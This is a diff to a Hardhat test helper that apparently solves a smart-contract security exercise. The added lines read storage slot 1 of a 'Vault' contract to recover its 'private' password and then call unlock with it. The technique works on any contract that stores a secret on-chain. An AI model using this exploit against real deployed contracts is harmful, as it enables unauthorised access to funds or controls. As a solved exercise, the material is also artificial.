@@ -1,6 +1,7 @@
 import { expect } from "chai";
 import { ethers, waffle } from "hardhat";
 
+
 const helper = async (victim: any) => {
   /* 
     Add code here that will help you pass the test
@@ -8,6 +9,8 @@ const helper = async (victim: any) => {
     Unlock the vault by somehow reading the private password from 
     Vault directly
   */
+  const pass = await ethers.provider.getStorageAt(victim.address, 1);
+  await victim.unlock(pass);
 };
 
 export default helper;
